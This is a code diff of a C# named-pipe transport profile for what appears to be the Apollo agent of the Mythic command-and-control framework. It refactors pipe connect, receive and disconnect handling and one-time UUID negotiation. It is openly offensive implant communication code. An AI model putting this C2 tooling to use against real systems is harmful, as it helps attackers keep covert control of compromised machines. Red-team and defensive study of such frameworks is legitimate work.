@@ -18,8 +18,14 @@ using ApolloInterop.Constants;
 
 namespace NamedPipeTransport
 {
-    public class NamedPipeProfile : C2Profile, IC2Profile, INamedPipeCallback
+    public class NamedPipeProfile : C2Profile, IC2Profile
     {
+        internal struct AsyncPipeState
+        {
+            internal PipeStream Pipe;
+            internal CancellationTokenSource Cancellation;
+            internal ST.Task Task;
+        }
         private static JsonSerializer _jsonSerializer = new JsonSerializer();
         private string _namedPipeName;
         private AsyncNamedPipeServer _server;
@@ -28,20 +34,26 @@ namespace NamedPipeTransport
         private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
         private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
-        private Dictionary<PipeStream, ST.Task> _writerTasks = new Dictionary<PipeStream, ST.Task>();
+        private Dictionary<PipeStream, AsyncPipeState> _writerTasks = new Dictionary<PipeStream, AsyncPipeState>();
         private Action<object> _sendAction;
+        private IAgent _agent;
+
+        private bool _uuidNegotiated = false;
+
         ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
         public NamedPipeProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
             _namedPipeName = data["pipename"];
             _encryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
+            _agent = agent;
             _sendAction = (object p) =>
             {
-                PipeStream pipe = (PipeStream)p;
-                while (pipe.IsConnected)
+                CancellationTokenSource cts = ((AsyncPipeState)p).Cancellation;
+                PipeStream pipe = ((AsyncPipeState)p).Pipe;
+                while (pipe.IsConnected && !cts.IsCancellationRequested)
                 {
                     _senderEvent.WaitOne();
-                    if (_senderQueue.TryDequeue(out byte[] result))
+                    if (!cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                     {
                         pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                     }
@@ -49,25 +61,35 @@ namespace NamedPipeTransport
             };
         }
 
-        public void OnAsyncConnect(PipeStream pipe, out Object state)
+        public void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
         {
-            _writerTasks[pipe] = new ST.Task(_sendAction, pipe);
-            _writerTasks[pipe].Start();
+            AsyncPipeState arg = new AsyncPipeState()
+            {
+                Pipe = args.Pipe,
+                Cancellation = new CancellationTokenSource(),
+            };
+            ST.Task tmp = new ST.Task(_sendAction, arg);
+            arg.Task = tmp;
+            _writerTasks[args.Pipe] = arg;
+            _writerTasks[args.Pipe].Task.Start();
             Connected = true;
-            state = this;
         }
 
-        public void OnAsyncDisconnect(PipeStream pipe, Object state)
+        public void OnAsyncDisconnect(object sender, NamedPipeMessageArgs args)
         {
-            pipe.Close();
-            _writerTasks[pipe].Wait();
-            _writerTasks.Remove(pipe);
+            args.Pipe.Close();
+            _writerTasks[args.Pipe].Cancellation.Cancel();
+            Connected = _writerTasks.Count - 1 > 0;
+            _senderEvent.Set();
+            _receiverEvent.Set();
+            _writerTasks[args.Pipe].Task.Wait();
+            _writerTasks.Remove(args.Pipe);
         }
 
-        public void OnAsyncMessageReceived(PipeStream pipe, IPCData data, Object state)
+        public void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
-                Encoding.UTF8.GetString(data.Data.Take(data.DataLength).ToArray()));
+                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
             lock(_messageOrganizer)
             {
                 if (!_messageOrganizer.ContainsKey(chunkedData.ID))
@@ -121,6 +143,8 @@ namespace NamedPipeTransport
                     _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                     return onResp(msg);
                 }
+                if (!Connected)
+                    break;
             }
             return true;
         }
@@ -130,10 +154,13 @@ namespace NamedPipeTransport
         {
             if (_server == null)
             {
-                _server = new AsyncNamedPipeServer(_namedPipeName, this, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
+                _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
+                _server.ConnectionEstablished += OnAsyncConnect;
+                _server.MessageReceived += OnAsyncMessageReceived;
+                _server.Disconnect += OnAsyncDisconnect;
             }
 
-            if (_encryptedExchangeCheck)
+            if (_encryptedExchangeCheck && !_uuidNegotiated)
             {
                 var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                 EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
@@ -159,8 +186,12 @@ namespace NamedPipeTransport
             return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
             {
                 MessageResponse mResp = (MessageResponse)resp;
+                if (!_uuidNegotiated)
+                {
+                    _uuidNegotiated = true;
+                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
+                }
                 Connected = true;
-                ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                 return onResp(mResp);
             });
         }
@@ -169,7 +200,7 @@ namespace NamedPipeTransport
         {
             Action<object> agentMessageConsumer = (object o) =>
             {
-                while(Agent.IsAlive())
+                while(Agent.IsAlive() && _writerTasks.Count > 0)
                 {
                     if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                     {
@@ -187,7 +218,7 @@ namespace NamedPipeTransport
             };
             ST.Task agentConsumerTask = new ST.Task(agentMessageConsumer, null);
             agentConsumerTask.Start();
-            while(Agent.IsAlive())
+            while(Agent.IsAlive() && _writerTasks.Count > 0)
             {
                 Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                 {
